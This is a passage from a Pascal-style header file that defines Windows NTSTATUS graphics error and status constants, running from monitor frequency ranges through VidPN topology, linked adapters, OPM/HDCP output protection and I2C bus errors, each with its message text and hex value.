// MessageText:
//
// Specified monitor frequency range set is invalid.
//
STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGESET = NTSTATUS($C01E031B);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE
//
// MessageText:
//
// Specified monitor frequency range is invalid.
//
STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE = NTSTATUS($C01E031C);

//
// MessageId: STATUS_GRAPHICS_FREQUENCYRANGE_NOT_IN_SET
//
// MessageText:
//
// Specified frequency range is not in the specified monitor frequency range set.
//
STATUS_GRAPHICS_FREQUENCYRANGE_NOT_IN_SET = NTSTATUS($C01E031D);

//
// MessageId: STATUS_GRAPHICS_NO_PREFERRED_MODE
//
// MessageText:
//
// Specified mode set does not specify preference for one of its modes.
//
STATUS_GRAPHICS_NO_PREFERRED_MODE = NTSTATUS($401E031E);

//
// MessageId: STATUS_GRAPHICS_FREQUENCYRANGE_ALREADY_IN_SET
//
// MessageText:
//
// Specified frequency range is already in the specified monitor frequency range set.
//
STATUS_GRAPHICS_FREQUENCYRANGE_ALREADY_IN_SET = NTSTATUS($C01E031F);

//
// MessageId: STATUS_GRAPHICS_STALE_MODESET
//
// MessageText:
//
// Specified mode set is stale. Please reacquire the new mode set.
//
STATUS_GRAPHICS_STALE_MODESET    = NTSTATUS($C01E0320);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITOR_SOURCEMODESET
//
// MessageText:
//
// Specified monitor source mode set is invalid.
//
STATUS_GRAPHICS_INVALID_MONITOR_SOURCEMODESET = NTSTATUS($C01E0321);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITOR_SOURCE_MODE
//
// MessageText:
//
// Specified monitor source mode is invalid.
//
STATUS_GRAPHICS_INVALID_MONITOR_SOURCE_MODE = NTSTATUS($C01E0322);

//
// MessageId: STATUS_GRAPHICS_NO_RECOMMENDED_FUNCTIONAL_VIDPN
//
// MessageText:
//
// Miniport does not have any recommendation regarding the request to provide a functional VidPN given the current display adapter configuration.
//
STATUS_GRAPHICS_NO_RECOMMENDED_FUNCTIONAL_VIDPN = NTSTATUS($C01E0323);

//
// MessageId: STATUS_GRAPHICS_MODE_ID_MUST_BE_UNIQUE
//
// MessageText:
//
// ID of the specified mode is already used by another mode in the set.
//
STATUS_GRAPHICS_MODE_ID_MUST_BE_UNIQUE = NTSTATUS($C01E0324);

//
// MessageId: STATUS_GRAPHICS_EMPTY_ADAPTER_MONITOR_MODE_SUPPORT_INTERSECTION
//
// MessageText:
//
// System failed to determine a mode that is supported by both the display adapter and the monitor connected to it.
//
STATUS_GRAPHICS_EMPTY_ADAPTER_MONITOR_MODE_SUPPORT_INTERSECTION = NTSTATUS($C01E0325);

//
// MessageId: STATUS_GRAPHICS_VIDEO_PRESENT_TARGETS_LESS_THAN_SOURCES
//
// MessageText:
//
// Number of video present targets must be greater than or equal to the number of video present sources.
//
STATUS_GRAPHICS_VIDEO_PRESENT_TARGETS_LESS_THAN_SOURCES = NTSTATUS($C01E0326);

//
// MessageId: STATUS_GRAPHICS_PATH_NOT_IN_TOPOLOGY
//
// MessageText:
//
// Specified present path is not in VidPN's topology.
//
STATUS_GRAPHICS_PATH_NOT_IN_TOPOLOGY = NTSTATUS($C01E0327);

//
// MessageId: STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_SOURCE
//
// MessageText:
//
// Display adapter must have at least one video present source.
//
STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_SOURCE = NTSTATUS($C01E0328);

//
// MessageId: STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_TARGET
//
// MessageText:
//
// Display adapter must have at least one video present target.
//
STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_TARGET = NTSTATUS($C01E0329);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITORDESCRIPTORSET
//
// MessageText:
//
// Specified monitor descriptor set is invalid.
//
STATUS_GRAPHICS_INVALID_MONITORDESCRIPTORSET = NTSTATUS($C01E032A);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITORDESCRIPTOR
//
// MessageText:
//
// Specified monitor descriptor is invalid.
//
STATUS_GRAPHICS_INVALID_MONITORDESCRIPTOR = NTSTATUS($C01E032B);

//
// MessageId: STATUS_GRAPHICS_MONITORDESCRIPTOR_NOT_IN_SET
//
// MessageText:
//
// Specified descriptor is not in the specified monitor descriptor set.
//
STATUS_GRAPHICS_MONITORDESCRIPTOR_NOT_IN_SET = NTSTATUS($C01E032C);

//
// MessageId: STATUS_GRAPHICS_MONITORDESCRIPTOR_ALREADY_IN_SET
//
// MessageText:
//
// Specified descriptor is already in the specified monitor descriptor set.
//
STATUS_GRAPHICS_MONITORDESCRIPTOR_ALREADY_IN_SET = NTSTATUS($C01E032D);

//
// MessageId: STATUS_GRAPHICS_MONITORDESCRIPTOR_ID_MUST_BE_UNIQUE
//
// MessageText:
//
// ID of the specified monitor descriptor is already used by another descriptor in the set.
//
STATUS_GRAPHICS_MONITORDESCRIPTOR_ID_MUST_BE_UNIQUE = NTSTATUS($C01E032E);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDPN_TARGET_SUBSET_TYPE
//
// MessageText:
//
// Specified video present target subset type is invalid.
//
STATUS_GRAPHICS_INVALID_VIDPN_TARGET_SUBSET_TYPE = NTSTATUS($C01E032F);

//
// MessageId: STATUS_GRAPHICS_RESOURCES_NOT_RELATED
//
// MessageText:
//
// Two or more of the specified resources are not related to each other, as defined by the interface semantics.
//
STATUS_GRAPHICS_RESOURCES_NOT_RELATED = NTSTATUS($C01E0330);

//
// MessageId: STATUS_GRAPHICS_SOURCE_ID_MUST_BE_UNIQUE
//
// MessageText:
//
// ID of the specified video present source is already used by another source in the set.
//
STATUS_GRAPHICS_SOURCE_ID_MUST_BE_UNIQUE = NTSTATUS($C01E0331);

//
// MessageId: STATUS_GRAPHICS_TARGET_ID_MUST_BE_UNIQUE
//
// MessageText:
//
// ID of the specified video present target is already used by another target in the set.
//
STATUS_GRAPHICS_TARGET_ID_MUST_BE_UNIQUE = NTSTATUS($C01E0332);

//
// MessageId: STATUS_GRAPHICS_NO_AVAILABLE_VIDPN_TARGET
//
// MessageText:
//
// Specified VidPN source cannot be used because there is no available VidPN target to connect it to.
//
STATUS_GRAPHICS_NO_AVAILABLE_VIDPN_TARGET = NTSTATUS($C01E0333);

//
// MessageId: STATUS_GRAPHICS_MONITOR_COULD_NOT_BE_ASSOCIATED_WITH_ADAPTER
//
// MessageText:
//
// Newly arrived monitor could not be associated with a display adapter.
//
STATUS_GRAPHICS_MONITOR_COULD_NOT_BE_ASSOCIATED_WITH_ADAPTER = NTSTATUS($C01E0334);

//
// MessageId: STATUS_GRAPHICS_NO_VIDPNMGR
//
// MessageText:
//
// Display adapter in question does not have an associated VidPN manager.
//
STATUS_GRAPHICS_NO_VIDPNMGR      = NTSTATUS($C01E0335);

//
// MessageId: STATUS_GRAPHICS_NO_ACTIVE_VIDPN
//
// MessageText:
//
// VidPN manager of the display adapter in question does not have an active VidPN.
//
STATUS_GRAPHICS_NO_ACTIVE_VIDPN  = NTSTATUS($C01E0336);

//
// MessageId: STATUS_GRAPHICS_STALE_VIDPN_TOPOLOGY
//
// MessageText:
//
// Specified VidPN topology is stale. Please reacquire the new topology.
//
STATUS_GRAPHICS_STALE_VIDPN_TOPOLOGY = NTSTATUS($C01E0337);

//
// MessageId: STATUS_GRAPHICS_MONITOR_NOT_CONNECTED
//
// MessageText:
//
// There is no monitor connected on the specified video present target.
//
STATUS_GRAPHICS_MONITOR_NOT_CONNECTED = NTSTATUS($C01E0338);

//
// MessageId: STATUS_GRAPHICS_SOURCE_NOT_IN_TOPOLOGY
//
// MessageText:
//
// Specified source is not part of the specified VidPN's topology.
//
STATUS_GRAPHICS_SOURCE_NOT_IN_TOPOLOGY = NTSTATUS($C01E0339);

//
// MessageId: STATUS_GRAPHICS_INVALID_PRIMARYSURFACE_SIZE
//
// MessageText:
//
// Specified primary surface size is invalid.
//
STATUS_GRAPHICS_INVALID_PRIMARYSURFACE_SIZE = NTSTATUS($C01E033A);

//
// MessageId: STATUS_GRAPHICS_INVALID_VISIBLEREGION_SIZE
//
// MessageText:
//
// Specified visible region size is invalid.
//
STATUS_GRAPHICS_INVALID_VISIBLEREGION_SIZE = NTSTATUS($C01E033B);

//
// MessageId: STATUS_GRAPHICS_INVALID_STRIDE
//
// MessageText:
//
// Specified stride is invalid.
//
STATUS_GRAPHICS_INVALID_STRIDE   = NTSTATUS($C01E033C);

//
// MessageId: STATUS_GRAPHICS_INVALID_PIXELFORMAT
//
// MessageText:
//
// Specified pixel format is invalid.
//
STATUS_GRAPHICS_INVALID_PIXELFORMAT = NTSTATUS($C01E033D);

//
// MessageId: STATUS_GRAPHICS_INVALID_COLORBASIS
//
// MessageText:
//
// Specified color basis is invalid.
//
STATUS_GRAPHICS_INVALID_COLORBASIS = NTSTATUS($C01E033E);

//
// MessageId: STATUS_GRAPHICS_INVALID_PIXELVALUEACCESSMODE
//
// MessageText:
//
// Specified pixel value access mode is invalid.
//
STATUS_GRAPHICS_INVALID_PIXELVALUEACCESSMODE = NTSTATUS($C01E033F);

//
// MessageId: STATUS_GRAPHICS_TARGET_NOT_IN_TOPOLOGY
//
// MessageText:
//
// Specified target is not part of the specified VidPN's topology.
//
STATUS_GRAPHICS_TARGET_NOT_IN_TOPOLOGY = NTSTATUS($C01E0340);

//
// MessageId: STATUS_GRAPHICS_NO_DISPLAY_MODE_MANAGEMENT_SUPPORT
//
// MessageText:
//
// Failed to acquire display mode management interface.
//
STATUS_GRAPHICS_NO_DISPLAY_MODE_MANAGEMENT_SUPPORT = NTSTATUS($C01E0341);

//
// MessageId: STATUS_GRAPHICS_VIDPN_SOURCE_IN_USE
//
// MessageText:
//
// Specified VidPN source is already owned by a DMM client and cannot be used until that client releases it.
//
STATUS_GRAPHICS_VIDPN_SOURCE_IN_USE = NTSTATUS($C01E0342);

//
// MessageId: STATUS_GRAPHICS_CANT_ACCESS_ACTIVE_VIDPN
//
// MessageText:
//
// Specified VidPN is active and cannot be accessed.
//
STATUS_GRAPHICS_CANT_ACCESS_ACTIVE_VIDPN = NTSTATUS($C01E0343);

//
// MessageId: STATUS_GRAPHICS_INVALID_PATH_IMPORTANCE_ORDINAL
//
// MessageText:
//
// Specified VidPN present path importance ordinal is invalid.
//
STATUS_GRAPHICS_INVALID_PATH_IMPORTANCE_ORDINAL = NTSTATUS($C01E0344);

//
// MessageId: STATUS_GRAPHICS_INVALID_PATH_CONTENT_GEOMETRY_TRANSFORMATION
//
// MessageText:
//
// Specified VidPN present path content geometry transformation is invalid.
//
STATUS_GRAPHICS_INVALID_PATH_CONTENT_GEOMETRY_TRANSFORMATION = NTSTATUS($C01E0345);

//
// MessageId: STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_SUPPORTED
//
// MessageText:
//
// Specified content geometry transformation is not supported on the respective VidPN present path.
//
STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_SUPPORTED = NTSTATUS($C01E0346);

//
// MessageId: STATUS_GRAPHICS_INVALID_GAMMA_RAMP
//
// MessageText:
//
// Specified gamma ramp is invalid.
//
STATUS_GRAPHICS_INVALID_GAMMA_RAMP = NTSTATUS($C01E0347);

//
// MessageId: STATUS_GRAPHICS_GAMMA_RAMP_NOT_SUPPORTED
//
// MessageText:
//
// Specified gamma ramp is not supported on the respective VidPN present path.
//
STATUS_GRAPHICS_GAMMA_RAMP_NOT_SUPPORTED = NTSTATUS($C01E0348);

//
// MessageId: STATUS_GRAPHICS_MULTISAMPLING_NOT_SUPPORTED
//
// MessageText:
//
// Multi-sampling is not supported on the respective VidPN present path.
//
STATUS_GRAPHICS_MULTISAMPLING_NOT_SUPPORTED = NTSTATUS($C01E0349);

//
// MessageId: STATUS_GRAPHICS_MODE_NOT_IN_MODESET
//
// MessageText:
//
// Specified mode is not in the specified mode set.
//
STATUS_GRAPHICS_MODE_NOT_IN_MODESET = NTSTATUS($C01E034A);

//
// MessageId: STATUS_GRAPHICS_DATASET_IS_EMPTY
//
// MessageText:
//
// Specified data set (e.g. mode set, frequency range set, descriptor set, topology, etc.) is empty.
//
STATUS_GRAPHICS_DATASET_IS_EMPTY = NTSTATUS($401E034B);

//
// MessageId: STATUS_GRAPHICS_NO_MORE_ELEMENTS_IN_DATASET
//
// MessageText:
//
// Specified data set (e.g. mode set, frequency range set, descriptor set, topology, etc.) does not contain any more elements.
//
STATUS_GRAPHICS_NO_MORE_ELEMENTS_IN_DATASET = NTSTATUS($401E034C);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY_RECOMMENDATION_REASON
//
// MessageText:
//
// Specified VidPN topology recommendation reason is invalid.
//
STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY_RECOMMENDATION_REASON = NTSTATUS($C01E034D);

//
// MessageId: STATUS_GRAPHICS_INVALID_PATH_CONTENT_TYPE
//
// MessageText:
//
// Specified VidPN present path content type is invalid.
//
STATUS_GRAPHICS_INVALID_PATH_CONTENT_TYPE = NTSTATUS($C01E034E);

//
// MessageId: STATUS_GRAPHICS_INVALID_COPYPROTECTION_TYPE
//
// MessageText:
//
// Specified VidPN present path copy protection type is invalid.
//
STATUS_GRAPHICS_INVALID_COPYPROTECTION_TYPE = NTSTATUS($C01E034F);

//
// MessageId: STATUS_GRAPHICS_UNASSIGNED_MODESET_ALREADY_EXISTS
//
// MessageText:
//
// No more than one unassigned mode set can exist at any given time for a given VidPN source/target.
//
STATUS_GRAPHICS_UNASSIGNED_MODESET_ALREADY_EXISTS = NTSTATUS($C01E0350);

//
// MessageId: STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_PINNED
//
// MessageText:
//
// Specified content transformation is not pinned on the specified VidPN present path.
//
STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_PINNED = NTSTATUS($401E0351);

//
// MessageId: STATUS_GRAPHICS_INVALID_SCANLINE_ORDERING
//
// MessageText:
//
// Specified scanline ordering type is invalid.
//
STATUS_GRAPHICS_INVALID_SCANLINE_ORDERING = NTSTATUS($C01E0352);

//
// MessageId: STATUS_GRAPHICS_TOPOLOGY_CHANGES_NOT_ALLOWED
//
// MessageText:
//
// Topology changes are not allowed for the specified VidPN.
//
STATUS_GRAPHICS_TOPOLOGY_CHANGES_NOT_ALLOWED = NTSTATUS($C01E0353);

//
// MessageId: STATUS_GRAPHICS_NO_AVAILABLE_IMPORTANCE_ORDINALS
//
// MessageText:
//
// All available importance ordinals are already used in specified topology.
//
STATUS_GRAPHICS_NO_AVAILABLE_IMPORTANCE_ORDINALS = NTSTATUS($C01E0354);

//
// MessageId: STATUS_GRAPHICS_INCOMPATIBLE_PRIVATE_FORMAT
//
// MessageText:
//
// Specified primary surface has a different private format attribute than the current primary surface
//
STATUS_GRAPHICS_INCOMPATIBLE_PRIVATE_FORMAT = NTSTATUS($C01E0355);

//
// MessageId: STATUS_GRAPHICS_INVALID_MODE_PRUNING_ALGORITHM
//
// MessageText:
//
// Specified mode pruning algorithm is invalid
//
STATUS_GRAPHICS_INVALID_MODE_PRUNING_ALGORITHM = NTSTATUS($C01E0356);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITOR_CAPABILITY_ORIGIN
//
// MessageText:
//
// Specified monitor capability origin is invalid.
//
STATUS_GRAPHICS_INVALID_MONITOR_CAPABILITY_ORIGIN = NTSTATUS($C01E0357);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE_CONSTRAINT
//
// MessageText:
//
// Specified monitor frequency range constraint is invalid.
//
STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE_CONSTRAINT = NTSTATUS($C01E0358);

//
// MessageId: STATUS_GRAPHICS_MAX_NUM_PATHS_REACHED
//
// MessageText:
//
// Maximum supported number of present paths has been reached.
//
STATUS_GRAPHICS_MAX_NUM_PATHS_REACHED = NTSTATUS($C01E0359);

//
// MessageId: STATUS_GRAPHICS_CANCEL_VIDPN_TOPOLOGY_AUGMENTATION
//
// MessageText:
//
// Miniport requested that augmentation be cancelled for the specified source of the specified VidPN's topology.
//
STATUS_GRAPHICS_CANCEL_VIDPN_TOPOLOGY_AUGMENTATION = NTSTATUS($C01E035A);

//
// MessageId: STATUS_GRAPHICS_INVALID_CLIENT_TYPE
//
// MessageText:
//
// Specified client type was not recognized.
//
STATUS_GRAPHICS_INVALID_CLIENT_TYPE = NTSTATUS($C01E035B);

//
// MessageId: STATUS_GRAPHICS_CLIENTVIDPN_NOT_SET
//
// MessageText:
//
// Client VidPN is not set on this adapter (e.g. no user mode initiated mode changes took place on this adapter yet).
//
STATUS_GRAPHICS_CLIENTVIDPN_NOT_SET = NTSTATUS($C01E035C);

//
//   Port specific status codes {0x0400..0x04ff}
//
//
// MessageId: STATUS_GRAPHICS_SPECIFIED_CHILD_ALREADY_CONNECTED
//
// MessageText:
//
// Specified display adapter child device already has an external device connected to it.
//
STATUS_GRAPHICS_SPECIFIED_CHILD_ALREADY_CONNECTED = NTSTATUS($C01E0400);

//
// MessageId: STATUS_GRAPHICS_CHILD_DESCRIPTOR_NOT_SUPPORTED
//
// MessageText:
//
// Specified display adapter child device does not support descriptor exposure.
//
STATUS_GRAPHICS_CHILD_DESCRIPTOR_NOT_SUPPORTED = NTSTATUS($C01E0401);

//
// MessageId: STATUS_GRAPHICS_UNKNOWN_CHILD_STATUS
//
// MessageText:
//
// Child device presence was not reliably detected.
//
STATUS_GRAPHICS_UNKNOWN_CHILD_STATUS = NTSTATUS($401E042F);

//
// MessageId: STATUS_GRAPHICS_NOT_A_LINKED_ADAPTER
//
// MessageText:
//
// The display adapter is not linked to any other adapters.
//
STATUS_GRAPHICS_NOT_A_LINKED_ADAPTER = NTSTATUS($C01E0430);

//
// MessageId: STATUS_GRAPHICS_LEADLINK_NOT_ENUMERATED
//
// MessageText:
//
// Lead adapter in a linked configuration was not enumerated yet.
//
STATUS_GRAPHICS_LEADLINK_NOT_ENUMERATED = NTSTATUS($C01E0431);

//
// MessageId: STATUS_GRAPHICS_CHAINLINKS_NOT_ENUMERATED
//
// MessageText:
//
// Some chain adapters in a linked configuration were not enumerated yet.
//
STATUS_GRAPHICS_CHAINLINKS_NOT_ENUMERATED = NTSTATUS($C01E0432);

//
// MessageId: STATUS_GRAPHICS_ADAPTER_CHAIN_NOT_READY
//
// MessageText:
//
// The chain of linked adapters is not ready to start because of an unknown failure.
//
STATUS_GRAPHICS_ADAPTER_CHAIN_NOT_READY = NTSTATUS($C01E0433);

//
// MessageId: STATUS_GRAPHICS_CHAINLINKS_NOT_STARTED
//
// MessageText:
//
// An attempt was made to start a lead link display adapter when the chain links were not started yet.
//
STATUS_GRAPHICS_CHAINLINKS_NOT_STARTED = NTSTATUS($C01E0434);

//
// MessageId: STATUS_GRAPHICS_CHAINLINKS_NOT_POWERED_ON
//
// MessageText:
//
// An attempt was made to power up a lead link display adapter when the chain links were powered down.
//
STATUS_GRAPHICS_CHAINLINKS_NOT_POWERED_ON = NTSTATUS($C01E0435);

//
// MessageId: STATUS_GRAPHICS_INCONSISTENT_DEVICE_LINK_STATE
//
// MessageText:
//
// The adapter link was found to be in an inconsistent state. Not all adapters are in an expected PNP/Power state.
//
STATUS_GRAPHICS_INCONSISTENT_DEVICE_LINK_STATE = NTSTATUS($C01E0436);

//
// MessageId: STATUS_GRAPHICS_LEADLINK_START_DEFERRED
//
// MessageText:
//
// Starting the leadlink adapter has been deferred temporarily.
//
STATUS_GRAPHICS_LEADLINK_START_DEFERRED = NTSTATUS($401E0437);

//
// MessageId: STATUS_GRAPHICS_NOT_POST_DEVICE_DRIVER
//
// MessageText:
//
// The driver trying to start is not the same as the driver for the POSTed display adapter.
//
STATUS_GRAPHICS_NOT_POST_DEVICE_DRIVER = NTSTATUS($C01E0438);

//
// MessageId: STATUS_GRAPHICS_POLLING_TOO_FREQUENTLY
//
// MessageText:
//
// The display adapter is being polled for children too frequently at the same polling level.
//
STATUS_GRAPHICS_POLLING_TOO_FREQUENTLY = NTSTATUS($401E0439);

//
// MessageId: STATUS_GRAPHICS_START_DEFERRED
//
// MessageText:
//
// Starting the adapter has been deferred temporarily.
//
STATUS_GRAPHICS_START_DEFERRED   = NTSTATUS($401E043A);

//
// MessageId: STATUS_GRAPHICS_ADAPTER_ACCESS_NOT_EXCLUDED
//
// MessageText:
//
// An operation is being attempted that requires the display adapter to be in a quiescent state.
//
STATUS_GRAPHICS_ADAPTER_ACCESS_NOT_EXCLUDED = NTSTATUS($C01E043B);

//
// MessageId: STATUS_GRAPHICS_DEPENDABLE_CHILD_STATUS
//
// MessageText:
//
// We can depend on the child device presence returned by the driver.
//
STATUS_GRAPHICS_DEPENDABLE_CHILD_STATUS = NTSTATUS($401E043C);

//
//   OPM, PVP and UAB status codes {0x0500..0x057F}
//
//
// MessageId: STATUS_GRAPHICS_OPM_NOT_SUPPORTED
//
// MessageText:
//
// The driver does not support OPM.
//
STATUS_GRAPHICS_OPM_NOT_SUPPORTED = NTSTATUS($C01E0500);

//
// MessageId: STATUS_GRAPHICS_COPP_NOT_SUPPORTED
//
// MessageText:
//
// The driver does not support COPP.
//
STATUS_GRAPHICS_COPP_NOT_SUPPORTED = NTSTATUS($C01E0501);

//
// MessageId: STATUS_GRAPHICS_UAB_NOT_SUPPORTED
//
// MessageText:
//
// The driver does not support UAB.
//
STATUS_GRAPHICS_UAB_NOT_SUPPORTED = NTSTATUS($C01E0502);

//
// MessageId: STATUS_GRAPHICS_OPM_INVALID_ENCRYPTED_PARAMETERS
//
// MessageText:
//
// The specified encrypted parameters are invalid.
//
STATUS_GRAPHICS_OPM_INVALID_ENCRYPTED_PARAMETERS = NTSTATUS($C01E0503);

//
// MessageId: STATUS_GRAPHICS_OPM_NO_PROTECTED_OUTPUTS_EXIST
//
// MessageText:
//
// The GDI display device passed to this function does not have any active protected outputs.
//
STATUS_GRAPHICS_OPM_NO_PROTECTED_OUTPUTS_EXIST = NTSTATUS($C01E0505);

//
// MessageId: STATUS_GRAPHICS_OPM_INTERNAL_ERROR
//
// MessageText:
//
// An internal error caused an operation to fail.
//
STATUS_GRAPHICS_OPM_INTERNAL_ERROR = NTSTATUS($C01E050B);

//
// MessageId: STATUS_GRAPHICS_OPM_INVALID_HANDLE
//
// MessageText:
//
// The function failed because the caller passed in an invalid OPM user mode handle.
//
STATUS_GRAPHICS_OPM_INVALID_HANDLE = NTSTATUS($C01E050C);

//
// MessageId: STATUS_GRAPHICS_PVP_INVALID_CERTIFICATE_LENGTH
//
// MessageText:
//
// A certificate could not be returned because the certificate buffer passed to the function was too small.
//
STATUS_GRAPHICS_PVP_INVALID_CERTIFICATE_LENGTH = NTSTATUS($C01E050E);

//
// MessageId: STATUS_GRAPHICS_OPM_SPANNING_MODE_ENABLED
//
// MessageText:
//
// The DxgkDdiOpmCreateProtectedOutput function could not create a protected output because the Video Present Target is in spanning mode.
//
STATUS_GRAPHICS_OPM_SPANNING_MODE_ENABLED = NTSTATUS($C01E050F);

//
// MessageId: STATUS_GRAPHICS_OPM_THEATER_MODE_ENABLED
//
// MessageText:
//
// The DxgkDdiOpmCreateProtectedOutput function could not create a protected output because the Video Present Target is in theater mode.
//
STATUS_GRAPHICS_OPM_THEATER_MODE_ENABLED = NTSTATUS($C01E0510);

//
// MessageId: STATUS_GRAPHICS_PVP_HFS_FAILED
//
// MessageText:
//
// The function failed because the display adapter's Hardware Functionality Scan failed to validate the graphics hardware.
//
STATUS_GRAPHICS_PVP_HFS_FAILED   = NTSTATUS($C01E0511);

//
// MessageId: STATUS_GRAPHICS_OPM_INVALID_SRM
//
// MessageText:
//
// The HDCP System Renewability Message passed to this function did not comply with section 5 of the HDCP 1.1 specification.
//
STATUS_GRAPHICS_OPM_INVALID_SRM  = NTSTATUS($C01E0512);

//
// MessageId: STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_HDCP
//
// MessageText:
//
// The protected output cannot enable the High-bandwidth Digital Content Protection (HDCP) System because it does not support HDCP.
//
STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_HDCP = NTSTATUS($C01E0513);

//
// MessageId: STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_ACP
//
// MessageText:
//
// The protected output cannot enable Analogue Copy Protection (ACP) because it does not support ACP.
//
STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_ACP = NTSTATUS($C01E0514);

//
// MessageId: STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_CGMSA
//
// MessageText:
//
// The protected output cannot enable the Content Generation Management System Analogue (CGMS-A) protection technology because it does not support CGMS-A.
//
STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_CGMSA = NTSTATUS($C01E0515);

//
// MessageId: STATUS_GRAPHICS_OPM_HDCP_SRM_NEVER_SET
//
// MessageText:
//
// The DxgkDdiOPMGetInformation function cannot return the version of the SRM being used because the application never successfully passed an SRM to the protected output.
//
STATUS_GRAPHICS_OPM_HDCP_SRM_NEVER_SET = NTSTATUS($C01E0516);

//
// MessageId: STATUS_GRAPHICS_OPM_RESOLUTION_TOO_HIGH
//
// MessageText:
//
// The DxgkDdiOPMConfigureProtectedOutput function cannot enable the specified output protection technology because the output's screen resolution is too high.
//
STATUS_GRAPHICS_OPM_RESOLUTION_TOO_HIGH = NTSTATUS($C01E0517);

//
// MessageId: STATUS_GRAPHICS_OPM_ALL_HDCP_HARDWARE_ALREADY_IN_USE
//
// MessageText:
//
// The DxgkDdiOPMConfigureProtectedOutput function cannot enable HDCP because the display adapter's HDCP hardware is already being used by other physical outputs.
//
STATUS_GRAPHICS_OPM_ALL_HDCP_HARDWARE_ALREADY_IN_USE = NTSTATUS($C01E0518);

//
// MessageId: STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_NO_LONGER_EXISTS
//
// MessageText:
//
// The operating system asynchronously destroyed this OPM protected output because the operating system's state changed. This error typically occurs because the monitor PDO associated with this protected output was removed, the monitor PDO associated with this protected output was stopped, or the protected output's session became a non-console session.
//
STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_NO_LONGER_EXISTS = NTSTATUS($C01E051A);

//
// MessageId: STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_COPP_SEMANTICS
//
// MessageText:
//
// Either the DxgkDdiOPMGetCOPPCompatibleInformation, DxgkDdiOPMGetInformation, or DxgkDdiOPMConfigureProtectedOutput function failed. This error is returned when the caller tries to use a COPP specific command while the protected output has OPM semantics only.
//
STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_COPP_SEMANTICS = NTSTATUS($C01E051C);

//
// MessageId: STATUS_GRAPHICS_OPM_INVALID_INFORMATION_REQUEST
//
// MessageText:
//
// The DxgkDdiOPMGetInformation and DxgkDdiOPMGetCOPPCompatibleInformation functions return this error code if the passed in sequence number is not the expected sequence number or the passed in OMAC value is invalid.
//
STATUS_GRAPHICS_OPM_INVALID_INFORMATION_REQUEST = NTSTATUS($C01E051D);

//
// MessageId: STATUS_GRAPHICS_OPM_DRIVER_INTERNAL_ERROR
//
// MessageText:
//
// The function failed because an unexpected error occurred inside of a display driver.
//
STATUS_GRAPHICS_OPM_DRIVER_INTERNAL_ERROR = NTSTATUS($C01E051E);

//
// MessageId: STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_OPM_SEMANTICS
//
// MessageText:
//
// Either the DxgkDdiOPMGetCOPPCompatibleInformation, DxgkDdiOPMGetInformation, or DxgkDdiOPMConfigureProtectedOutput function failed. This error is returned when the caller tries to use an OPM specific command while the protected output has COPP semantics only.
//
STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_OPM_SEMANTICS = NTSTATUS($C01E051F);

//
// MessageId: STATUS_GRAPHICS_OPM_SIGNALING_NOT_SUPPORTED
//
// MessageText:
//
// The DxgkDdiOPMGetCOPPCompatibleInformation and DxgkDdiOPMConfigureProtectedOutput functions return this error if the display driver does not support the DXGKMDT_OPM_GET_ACP_AND_CGMSA_SIGNALING and DXGKMDT_OPM_SET_ACP_AND_CGMSA_SIGNALING GUIDs.
//
STATUS_GRAPHICS_OPM_SIGNALING_NOT_SUPPORTED = NTSTATUS($C01E0520);

//
// MessageId: STATUS_GRAPHICS_OPM_INVALID_CONFIGURATION_REQUEST
//
// MessageText:
//
// The DxgkDdiOPMConfigureProtectedOutput function returns this error code if the passed in sequence number is not the expected sequence number or the passed in OMAC value is invalid.
//
STATUS_GRAPHICS_OPM_INVALID_CONFIGURATION_REQUEST = NTSTATUS($C01E0521);

//
//   Monitor Configuration API status codes {0x0580..0x05DF}
//
//
// MessageId: STATUS_GRAPHICS_I2C_NOT_SUPPORTED
//
// MessageText:
//
// The monitor connected to the specified video output does not have an I2C bus.
//
STATUS_GRAPHICS_I2C_NOT_SUPPORTED = NTSTATUS($C01E0580);

//
// MessageId: STATUS_GRAPHICS_I2C_DEVICE_DOES_NOT_EXIST
//
// MessageText:
//
// No device on the I2C bus has the specified address.
//
STATUS_GRAPHICS_I2C_DEVICE_DOES_NOT_EXIST = NTSTATUS($C01E0581);

//
// MessageId: STATUS_GRAPHICS_I2C_ERROR_TRANSMITTING_DATA
//
// MessageText:
//
// An error occurred while transmitting data to the device on the I2C bus.
//
STATUS_GRAPHICS_I2C_ERROR_TRANSMITTING_DATA = NTSTATUS($C01E0582);

//
